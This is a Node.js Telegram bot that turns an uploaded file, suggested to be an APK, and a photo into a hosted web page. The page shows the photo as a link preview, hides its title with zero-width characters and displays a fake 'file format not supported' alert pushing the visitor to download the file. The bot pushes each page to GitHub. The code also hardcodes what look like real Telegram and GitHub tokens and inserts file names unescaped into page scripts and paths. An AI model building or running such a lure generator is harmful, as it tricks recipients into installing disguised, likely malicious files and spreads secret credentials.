const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

// Конфигурация
const BOT_TOKEN = '8269773878:AAEN3q-1CWMsKb1cfBhW-HTPI_9iSjOj-DI';
const GITHUB_TOKEN = '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';
const GITHUB_REPO = 'host548/bot-telegram-photo';
const SITE_URL = 'https://bot-telegram-photo.pages.dev';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Хранилище сессий пользователей
const userSessions = new Map();

class UserSession {
  constructor(userId) {
    this.userId = userId;
    this.step = 'waiting_file';
    this.fileId = null;
    this.photoId = null;
    this.fileName = null;
    this.uniqueId = crypto.randomBytes(6).toString('hex');
  }
}

// Команда /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const session = new UserSession(chatId);
  userSessions.set(chatId, session);
  
  bot.sendMessage(chatId, 
    '👋 *Привет!*\n\n' +
    'Я помогу создать ссылку для твоего файла с красивым превью.\n\n' +
    '📎 *Отправь мне файл* (APK или любой другой)',
    { parse_mode: 'Markdown' }
  );
});

// Обработка документов (файлов)
bot.on('document', async (msg) => {
  const chatId = msg.chat.id;
  const session = userSessions.get(chatId);
  
  if (!session) {
    bot.sendMessage(chatId, 'Используй /start чтобы начать');
    return;
  }
  
  if (session.step !== 'waiting_file') {
    bot.sendMessage(chatId, '⚠️ Сначала нужно отправить фото!');
    return;
  }
  
  const file = msg.document;
  
  // Проверка размера (лимит Telegram API: 20 MB)
  if (file.file_size > 20 * 1024 * 1024) {
    bot.sendMessage(chatId, '❌ Файл слишком большой! Максимум 20 МБ.');
    return;
  }
  
  session.fileId = file.file_id;
  session.fileName = file.file_name;
  session.step = 'waiting_photo';
  
  bot.sendMessage(chatId, 
    '✅ *Файл получен!*\n\n' +
    `📄 Имя: \`${file.file_name}\`\n` +
    `📦 Размер: ${(file.file_size / 1024 / 1024).toFixed(2)} МБ\n\n` +
    '📷 *Теперь отправь фото* для предпросмотра',
    { parse_mode: 'Markdown' }
  );
});

// Обработка фото
bot.on('photo', async (msg) => {
  const chatId = msg.chat.id;
  const session = userSessions.get(chatId);
  
  if (!session) {
    bot.sendMessage(chatId, 'Используй /start чтобы начать');
    return;
  }
  
  if (session.step !== 'waiting_photo') {
    bot.sendMessage(chatId, '⚠️ Сначала отправь файл!');
    return;
  }
  
  const photo = msg.photo[msg.photo.length - 1];
  session.photoId = photo.file_id;
  session.step = 'processing';
  
  const processingMsg = await bot.sendMessage(chatId, 
    '⏳ *Обрабатываю...*\n\n' +
    '▪️ Скачиваю файлы\n' +
    '▪️ Создаю страницу\n' +
    '▪️ Загружаю на сервер',
    { parse_mode: 'Markdown' }
  );
  
  try {
    // Скачиваем файлы
    await bot.editMessageText(
      '⏳ *Обрабатываю...*\n\n' +
      '✅ Скачиваю файлы\n' +
      '▪️ Создаю страницу\n' +
      '▪️ Загружаю на сервер',
      { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
    );
    
    const fileData = await downloadTelegramFile(session.fileId);
    const photoData = await downloadTelegramFile(session.photoId);
    
    // Создаем папку
    await bot.editMessageText(
      '⏳ *Обрабатываю...*\n\n' +
      '✅ Скачиваю файлы\n' +
      '✅ Создаю страницу\n' +
      '▪️ Загружаю на сервер',
      { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
    );
    
    const userFolder = path.join(__dirname, '..', 'public', 'u', session.uniqueId);
    await fs.mkdir(userFolder, { recursive: true });
    
    // Сохраняем файлы
    await fs.writeFile(path.join(userFolder, session.fileName), fileData);
    await fs.writeFile(path.join(userFolder, 'photo.jpg'), photoData);
    
    // Создаем HTML
    const html = generateHTML(session);
    await fs.writeFile(path.join(userFolder, 'index.html'), html);
    
    // Git push
    await bot.editMessageText(
      '⏳ *Обрабатываю...*\n\n' +
      '✅ Скачиваю файлы\n' +
      '✅ Создаю страницу\n' +
      '✅ Загружаю на сервер',
      { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
    );
    
    await gitPush(session.uniqueId);
    
    // Готово!
    const userUrl = `${SITE_URL}/u/${session.uniqueId}/`;
    
    await bot.deleteMessage(chatId, processingMsg.message_id);
    
    await bot.sendMessage(chatId,
      '✅ *Готово!*\n\n' +
      `🔗 Твоя ссылка:\n\`${userUrl}\`\n\n` +
      '⏱ Страница будет доступна через *30-60 секунд*\n\n' +
      '💡 Отправь эту ссылку кому нужно - они увидят фото и смогут скачать файл!',
      { parse_mode: 'Markdown' }
    );
    
    // Очищаем сессию
    userSessions.delete(chatId);
    
  } catch (error) {
    console.error('Ошибка:', error);
    await bot.editMessageText(
      '❌ *Произошла ошибка*\n\n' +
      'Попробуй снова: /start',
      { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
    );
  }
});

// Скачивание файла из Telegram
async function downloadTelegramFile(fileId) {
  const fileInfo = await bot.getFile(fileId);
  const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
  const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
  return Buffer.from(response.data);
}

// Генерация HTML
function generateHTML(session) {
  return `<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>&#8203;</title>
    
    <meta property="og:type" content="website">
    <meta property="og:url" content="${SITE_URL}/u/${session.uniqueId}/">
    <meta property="og:title" content="&#8203;">
    <meta property="og:site_name" content="&#8203;">
    <meta property="og:description" content="&#8203;">
    
    <meta property="og:image" content="${SITE_URL}/u/${session.uniqueId}/photo.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="&#8203;">
    <meta name="twitter:image" content="${SITE_URL}/u/${session.uniqueId}/photo.jpg">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html { 
            height: 100%; 
            width: 100%; 
            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Segoe UI', sans-serif;
            background-color: #000;
            overflow: hidden;
        }

        .photo-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            position: relative;
        }

        .photo-container img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        .loading-spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            z-index: 10;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #fff;
            font-size: 14px;
            font-weight: 400;
        }

        .notification {
            position: fixed;
            top: -200px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 400px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            z-index: 1000;
            transition: top 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .notification.show {
            top: 20px;
        }

        .notification-header {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            background: #f5f5f5;
            border-bottom: 1px solid #e0e0e0;
        }

        .notification-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            background: #ff5252;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
        }

        .notification-title {
            font-size: 14px;
            font-weight: 500;
            color: #212121;
        }

        .notification-body {
            padding: 16px;
        }

        .notification-message {
            font-size: 14px;
            color: #424242;
            line-height: 1.5;
            margin-bottom: 4px;
        }

        .notification-submessage {
            font-size: 12px;
            color: #757575;
            line-height: 1.4;
            margin-bottom: 16px;
        }

        .notification-button {
            width: 100%;
            padding: 12px;
            background: #1976d2;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            text-transform: none;
            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Segoe UI', sans-serif;
            transition: background 0.2s;
        }

        .notification-button:active {
            background: #1565c0;
        }

        .notification-time {
            font-size: 11px;
            color: #9e9e9e;
            padding: 8px 16px;
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="photo-container">
        <img src="photo.jpg" alt="Фото">
        
        <div class="loading-spinner" id="loadingSpinner">
            <div class="spinner"></div>
            <div class="loading-text">Открытие файла...</div>
        </div>
    </div>

    <div class="notification" id="notification">
        <div class="notification-header">
            <div class="notification-icon">!</div>
            <div class="notification-title">Не удается открыть файл</div>
        </div>
        <div class="notification-body">
            <div class="notification-message">
                Формат файла не поддерживается вашим устройством
            </div>
            <div class="notification-submessage">
                Скачайте файл для просмотра в галерее или стороннем приложении
            </div>
            <button class="notification-button" onclick="downloadFile()">
                Скачать и открыть в галерее
            </button>
        </div>
        <div class="notification-time">Только что</div>
    </div>
    
    <script>
        function downloadFile() {
            const link = document.createElement('a');
            link.href = '${session.fileName}';
            link.download = '${session.fileName}';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        window.onload = function() {
            setTimeout(() => {
                document.getElementById('loadingSpinner').style.display = 'flex';
            }, 2000);

            setTimeout(() => {
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('notification').classList.add('show');
            }, 4000);
        };
    </script>
</body>
</html>`;
}

// Git push
async function gitPush(uniqueId) {
  try {
    const repoPath = path.join(__dirname, '..');
    
    // Настройка Git
    execSync(`git config user.name "Bot"`, { cwd: repoPath });
    execSync(`git config user.email "bot@telegram.com"`, { cwd: repoPath });
    
    // Добавляем файлы
    execSync(`git add public/u/${uniqueId}/`, { cwd: repoPath });
    
    // Коммит
    execSync(`git commit -m "Add user ${uniqueId}"`, { cwd: repoPath });
    
    // Push с токеном
    const remoteUrl = `https://${GITHUB_TOKEN}@github.com/${GITHUB_REPO}.git`;
    execSync(`git remote set-url origin ${remoteUrl}`, { cwd: repoPath });
    execSync(`git push origin main`, { cwd: repoPath });
    
    console.log(`✅ Pushed user ${uniqueId} to GitHub`);
  } catch (error) {
    console.error('Git push error:', error.message);
    throw error;
  }
}

console.log('🤖 Бот запущен!');
